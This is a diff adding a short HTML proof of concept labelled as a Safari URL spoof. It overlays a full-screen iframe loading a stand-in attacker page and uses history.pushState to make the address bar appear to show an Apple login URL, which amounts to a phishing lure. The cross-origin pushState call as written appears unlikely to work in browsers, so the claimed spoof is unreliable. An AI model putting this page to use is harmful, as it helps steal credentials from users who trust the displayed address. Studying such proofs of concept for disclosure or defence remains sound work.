@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Safari URL Spoof PoC</title>
+</head>
+<body>
+  <h1>This is a test for Safari spoofing</h1>
+  <iframe src="https://your-evil-site.com/fake" style="position:absolute;top:0;left:0;width:100vw;height:100vh;z-index:999;"></iframe>
+  <script>
+    history.pushState({}, '', 'https://apple.com/login');
+  </script>
+</body>
+</html>
